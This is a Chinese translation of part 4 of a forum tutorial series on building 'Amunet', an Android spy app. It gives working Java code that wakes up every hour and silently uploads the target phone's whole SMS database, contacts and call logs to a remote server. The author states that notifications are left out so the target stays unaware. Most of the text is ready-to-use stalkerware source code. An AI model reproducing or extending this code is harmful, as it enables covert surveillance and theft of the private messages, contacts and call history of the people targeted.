# 建立一个类似于天眼的Android应用程序：第4部分 - 持久收集联系人，通话记录和短信（SMS）

[电话黑客](https://www.0x00sec.org/c/phone-hacking)  
[android](https://www.0x00sec.org/tags/android)  
[恶意软件](https://www.0x00sec.org/tags/malware)  
[编程](https://www.0x00sec.org/tags/programming)  
[黑客入侵](https://www.0x00sec.org/tags/hacking)  
[linux](https://www.0x00sec.org/tags/linux)

* * *

随着我们继续我们的系列，AMUNET应用程序变得复杂，需要了解新的功能和结构。我们将继续前进。如前面教程中所述，该应用程序并不完全存在，因为我在分享之前构建了它们，如果在教程出来之前时间很长的话请原谅我。我需要确保一切顺利。

以前的教程

以下是截止到目前为止所涵盖的教程。

1.[Amunet简介](https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112/4)

2.[获取已安装的应用](https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121)

3.[将信息发送到Web服务器](https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168)

4.[授予额外功能的权限](https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317)

常问问题

我一直在接受读者提问，这些问题最为普遍。

问：如何在我的localhost上收集信息

答：本教程不限制您使用测试服务器。如前所述，只需更改Configuration.java中的服务器端点（IP地址），并确保您的服务器接受传递的POST参数。

问：我可以获取测试服务器的源代码（PHP）

答：绝对不可以。

问：我的数据存储在测试服务器上的哪个位置？

答：我是隐私和数据保护的忠实粉丝。话虽如此，发送到测试服务器的每个数据都是加密的（用户名和密码）。我使用bcrypt保护机密信息，因此，我可以访问存储在服务器上但不能解密或读取它们的信息。只有合适的用户才可以。

问：我是否会为使用测试服务器付费？

答：当然不用。该服务器仅用于帮助完成本教程。无需支付任何费用。这是出于善意而建立的。

问：什么是API auth关键的东西？

答：API Auth密钥可帮助服务器识别正确的用户。没有它，任何发送的数据都将被拒绝。

问：我是否需要本地服务器上的API身份验证密钥？

A：不，请。您不需要本地服务器上的身份验证密钥。您只需要接受Volley发送的POST参数即可。

今天的教程

在今天的教程中，我们将持续收集有关手机上联系人，通话记录和短信（短信）的信息。从某种意义上说，我们将把代码放在定期运行（不时，间隔）的服务中，并确保我们拥有最新的信息。您可以将间隔设置为从一分钟到一天中任何一小时的任何值。

继续上一个教程，我们再添加一个按钮，触发目标设备上的监控。让我们转到我们的content_dashboard.xml并添加按钮。

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    app:layout_behavior="@string/appbar_scrolling_view_behavior"
    tools:context=".Dashboard"
    tools:showIn="@layout/activity_dashboard">
    
    <android.support.v7.widget.RecyclerView
        android:layout_width="match_parent"
        android:layout_above="@id/service_monitor_button"
        android:id="@+id/dashboard_recycler_view"
        android:layout_height="match_parent" />
    
    <Button
        android:layout_width="match_parent"
        android:text="Start MONITORING"
        android:padding="10dp"
        android:id="@+id/service_monitor_button"
        android:textColor="@android:color/white"
        android:background="@color/colorPrimary"
        style="@style/Base.Widget.AppCompat.Button.Borderless"
        android:layout_alignParentBottom="true"
        android:layout_height="wrap_content" />
    
    </RelativeLayout>

使用布局中声明的按钮，让我们在Dashboard.java文件中声明。 在公共类Dashboard ...语句下面，声明按钮。

    
    
    public class Dashboard extends AppCompatActivity {
    
         private RecyclerView recyclerView;
         private List<RecyclerJava> recyclerJavaList = new ArrayList<>();
         private RecyclerAdapter recyclerAdapter;
    
         private Button service_monitor_btn; // New added button declaration
    
         protected static final int GPS_REQUEST_CODE = 5000;
         protected static final int CONTACTS_REQUEST_CODE = 5001;
         protected static final int CALENDAR_REQUEST_CODE = 5002;
         protected static final int MIC_REQUEST_CODE = 5003;
         protected static final int CAMERA_REQUEST_CODE = 5004;
         protected static final int STORAGE_REQUEST_CODE = 5005;
         protected static final int SMS_REQUEST_CODE = 5006;
    ONCREATE METHOD

ONCREATE方法

声明我们的按钮后，让我们滚动到onCreate方法并设置对我们按钮的引用并设置单击侦听器。

    
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_dashboard);
        Toolbar toolbar = findViewById(R.id.dashboard_toolbar);
        setSupportActionBar(toolbar);
    
        recyclerView = findViewById(R.id.dashboard_recycler_view);
    
        recyclerAdapter = new RecyclerAdapter(recyclerJavaList);
        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(getApplicationContext());
        recyclerView.setLayoutManager(mLayoutManager);
        recyclerView.setItemAnimator(new DefaultItemAnimator());
        recyclerView.addItemDecoration(new DividerItemDecoration(Dashboard.this, LinearLayoutManager.VERTICAL));
    
        // Finding the button
        service_monitor_btn = findViewById(R.id.service_monitor_button);
    
       // Checking if our TimerService is running
        if(MyServiceIsRunning(TimerService.class)) {
            service_monitor_btn.setText("STOP MONITORING");
        } else {
            service_monitor_btn.setText("START MONITORING");
        }
    
        // Setting a click listener on the button
        service_monitor_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if(MyServiceIsRunning(TimerService.class)) {
                    Log.i("0x00sec", "Stopping Service ...");
                    stopService(new Intent(Dashboard.this, TimerService.class));
                    service_monitor_btn.setText("START MONITORING");
                } else {
                    Log.i("0x00sec", "Starting Service ...");
                    startService(new Intent(Dashboard.this, TimerService.class));
                    service_monitor_btn.setText("STOP MONITORING");
                }
            }
        });
    
        updateRecycler();
    }

1 - 我们将按钮分配给布局文件中的视图对象。

2 - MyServiceIsRunning是一种检查服务是否正在运行的方法。 我们希望按钮上的文本设置为在服务运行时停止，并在服务未运行时启动。

3 - 要检查的服务是TimerService.class。 其功能是设置一个重复报警功能，调用广播接收器向服务器发送信息。 让我们一点一点地接受它。

MYSERVICEISRUNNING

解释此方法接受服务参数并检查服务是否正在运行并返回一个布尔值（true / false）

    
    
    private boolean MyServiceIsRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

计时的服务

此服务启动一个调用广播接收器的重复警报（警报管理器）。 接收器然后开始上传信息。 创建一个新的java类并将其扩展到Service类。

![image.png](https://image.3001.net/images/20180816/1534401370_5b751b5ae36b7.png!small)让我们开始code：  

    
    
    import android.app.AlarmManager;
    import android.app.PendingIntent;
    import android.app.Service;
    import android.content.Context;
    import android.content.Intent;
    import android.os.IBinder;
    import android.os.SystemClock;
    import android.support.annotation.Nullable;
    import android.util.Log;
    
    public class TimerService extends Service {
    
    @Override
    public void onCreate() {
        super.onCreate();
    
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(TimerService.this, ServerUpdateReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this,0,intent, 0);
        alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime(),
                AlarmManager.INTERVAL_HOUR,
                pendingIntent);
        // stopSelf(); // Optional
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }
    
    @Override
    public void onDestroy() { // Stop Service
        super.onDestroy();
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    }

唯一重要的方法是onCreate方法。

使用AlarmManager，我们安排重复警报来调用ServerUpdateReceiver.class（广播接收器）。数据可以通过intent.putExtra调用传递给接收者，但我们现在不会传递任何数据。

需要注意的另一件事是AlarmManager.INTERVAL_HOUR。这段参数（以毫秒为单位）是警报的间隔。最小值是60秒（1分钟 -60000毫秒），你不能在下面设置。如果将其设置为低于60秒，Android将强制将其设置为一分钟。我们将接收器配置为每小时调用一次。建议甚至增加一点，因为频繁的调用可以调用应用程序崩溃，电池耗尽或在内存不足的情况下杀死我们的应用程序。

我完全清楚，在发送数据之前，我们不会检查手机是否已连接到互联网。我们稍后会修复，但同时我们必须确保手机已连接到互联网。没有互联网连接的重复呼叫将导致应用暂时崩溃。暂时因为警报呼叫将再次被触发，而警报呼叫将再次呼叫我们的接收器。持续重复。

服务更新接收器（广播）

该接收器只是将定期数据发送到我们定义的服如果未授予权限，则不会调用适当的方法，因为android不允许我们收集我们无权访问的数据。

创建一个java类并将其扩展到BroadcastReceiver类。

![image.png](https://image.3001.net/images/20180816/1534401384_5b751b68ac352.png!small)  

请记住，如果您没有根据教程中的对象命名对象，请确保根据代码替换它们。

BroadcastReceiver唯一需要的方法是onReceive Override方法。 你的代码应该是这样的：

    
    
    public class ServerUpdateReceiver extends BroadcastReceiver {
    
       @Override
       public void onReceive(Context context, Intent intent) {
    
       }
    
    }

在public class语句下面，让我们声明一个Context。 有了这个，所有其他方法都可以访问它。

    
    
    public class ServerUpdateReceiver extends BroadcastReceiver {
    
        Context context;
        ...

开展方法

在该方法中，我们首先检查是否授予了权限，然后调用适当的方法。 本教程将介绍联系人，通话记录和短信。

    
    
    @Override
    public void onReceive(Context context, Intent intent) {
    
        this.context = context;
    
        if(ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    update_Server_SMS();
                }
            }).start();
        }
    
        if(ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    update_Server_Contacts();
                    update_Server_Call_Logs();
                }
            }).start();
        }
    }

将SMS消息发送到服务器的方法是update_Server_SMS，负责发送联系信息和调用日志的方法是update_Server_Call_Logs和update_Server_Contacts。

而不是使用不同的方法来处理与服务器的通信。 我们将创建一个接受POST参数和处理程序通信的方法。
有了这个，类中的所有方法都可以通过调用它并传递它们的参数来进行外部通信。

UPDATE_SERVER方法

更新服务器是处理与服务器的通信的方法。 它接受POST参数并发送它们。

    
    
    private void update_Server(final Map<String, String> params) {
    
        RequestQueue requestQueue = Volley.newRequestQueue(context);
    
        StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener<String>() {
            @Override
            public void onResponse(String req) {
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
            }
        }) {
            protected Map<String, String> getParams() {
                return params;
            }
        };
    
        requestQueue.add(serverRequest);
    }

由于这个类是非UI（呃，也许可以做很少的UI工作，如通知等），我们不想推送如上传完成的任何通知，因为它是间谍应用程序：我们让目标不想知道已发送的信息的。
尽可能的安静。 因此，我们不在此处包含任何UI代码。 由于我们也不知道我们的数据是否已保存，因此我们确保服务器正确接收数据。 继续 …

UPDATE_SERVER_SMS

此方法读取电话的SMS数据库（收件箱，草稿，已发送），并通过update_Server方法将它们发送到服务器。

    
    
    private void update_Server_SMS() {
    
        SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
        final String auth_key = sharedPreferences.getString("auth_key", null);
    
        try {
            Uri uriSMSURI = Uri.parse("content://sms");
    
            Cursor cursor = context.getContentResolver().query(uriSMSURI, null, null, null,null);
    
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address")).toString();
                String message = cursor.getString(cursor.getColumnIndexOrThrow("body")).toString();
                String date = cursor.getString(cursor.getColumnIndexOrThrow("date")).toString();
                String read = cursor.getString(cursor.getColumnIndexOrThrow("read")).toString();
                String type = cursor.getString(cursor.getColumnIndexOrThrow("type")).toString();
                String id = cursor.getString(cursor.getColumnIndexOrThrow("_id")).toString();
    
                if(read.equals("0")) { read = "no"; } else { read = "yes"; }
                if(type.equals("1")) { type = "inbox"; } else if(type.equals("2")) { type = "sent"; } else { type = "draft"; }
                date = get_Long_Date(date);
    
                // THIS IS HOW TO CREATE THE POST PARAMETERS ( MAP ARRAY )
                Map<String, String> params = new HashMap<>();
                params.put("address", address);
                params.put("message", message);
                params.put("date", date);
                params.put("read",  read);
                params.put("id", id);
                params.put("type", type);
                params.put("auth", auth_key);
    
                update_Server(params);
            }
        } catch (Exception e) {
        }
    }

  * content：// sms - 允许我们遍历整个SMS数据库，而不是将自己限制在收件箱，草稿或已发送的邮件中。

  * cursor.getColumnIndexOrThrow - 允许我们获取光标的相应列索引。 请注意，输入错误的列名将导致应用程序崩溃。 这些是列的含义。

    * 地址 - 电话号码

    * 消息 - 消息的内容

    * 日期 - 消息的时间

    * 读 - 消息状态（0 - 不读，1 - 读）

    * 类型 - 消息类型（1 - 收件箱，2 - 发件箱，3 - 草稿（猜测工作））

    * id - 唯一的消息标识符
  * 使用get_Long_Date将日期构造成人类可读的。

  * 然后我们构造POST参数并调用update_Server方法来传递信息。

然后服务器应该收到类似$ _POST ['address'] && $ _POST ['message']的内容......

GET_LONG_DATE方法

接受并将传递的参数转换为可读参数。

    
    
    private String get_Long_Date(String date) {
        Long timestamp = Long.parseLong(date);
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(timestamp);
        DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        return formatter.format(calendar.getTime());
    }

UPDATE_SERVER_CONTACTS

这个方法与上面的方法一样，遍历Contact数据库，获取信息并发送它。

    
    
    private void update_Server_Contacts() {
    
        SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
        final String auth_key = sharedPreferences.getString("auth_key", null);
    
        Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null,
                null, null, null);
        while (cursor.moveToNext()) {
            try{
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name=cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                String phoneNumber = null;
    
                if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor phones = context.getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ contactId, null, null);
                    while (phones.moveToNext()) {
                        phoneNumber = phones.getString(phones.getColumnIndex( ContactsContract.CommonDataKinds.Phone.NUMBER));
                        break;
                    }
                    phones.close();
    
                    if(phoneNumber != null) {
    
                        Map<String, String> params = new HashMap<>();
                        params.put("contact_name", name);
                        params.put("contact_phone", phoneNumber);
                        params.put("auth", auth_key);
    
                        update_Server(params);
                    }
                }
            }catch(Exception e) {
    
            }
        }
    }

同样，更改ColumnIndex将导致应用程序崩溃。 它们是不变的价值观。

UPDATE_SERVER_CALL_LOGS

方法就像其他两个循环通过调用日志数据库并获取信息。

    
    
    @SuppressLint("MissingPermission")
    private void update_Server_Call_Logs() {
    
        SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
        final String auth_key = sharedPreferences.getString("auth_key", null);
    
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int phone_number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
    
        while (cursor.moveToNext()) {
            String number = cursor.getString(phone_number);
            String call_type = cursor.getString(type);
            String call_date = get_Long_Date(cursor.getString(date));
            String call_duration = cursor.getString(duration);
            int call_code = Integer.parseInt(call_type);
    
            switch (call_code) {
                case CallLog.Calls.OUTGOING_TYPE:
                    call_type = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    call_type = "INCOMING";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    call_type = "MISSED";
                    break;
            }
    
            Map<String, String> params = new HashMap<>();
    
            params.put("phone_number", number);
            params.put("call_date", call_date);
            params.put("call_type", call_type);
            params.put("call_duration", call_duration);
            params.put("auth", auth_key);
    
            update_Server(params);
        }
    
        cursor.close();
    }

我们已完成本教程。 在我们超越自我之前。 我花了几天时间才意识到我忘记添加适当的呼叫日志权限，尽管我们已经在上一个教程中添加了它们。
没有READ_CALL_LOGS和WRITE_CALL_LOGS权限。 我们无法访问通话记录。 让我们将它们添加到AndroidManifest.xml。

    
    
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />

现在来吧，运行你的Android应用程序。 允许权限并开始监控。 您的数据应该发送到测试服务器（如果您使用我的测试服务器）。

结论

我喜欢你的贡献，建议，反馈，评论家等任何有助于该系列。

如果遇到问题，可以直接将项目导入Android工作室。

检查github
repo：[https：//github.com/sergeantexploiter/Amunet](https://bbs.ichunqiu.com/https%EF%BC%9A//github.com/sergeantexploiter/Amunet)

期待下次再遇见！

作者：sergeantsploit

翻译：i春秋翻译小组-Neo（李皓伟）

翻译来源：<https://www.0x00sec.org/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375>

大家有任何问题可以提问，更多文章可到[i春秋论坛](https://bbs.ichunqiu.com/portal.php?from=beef)阅读哟~  

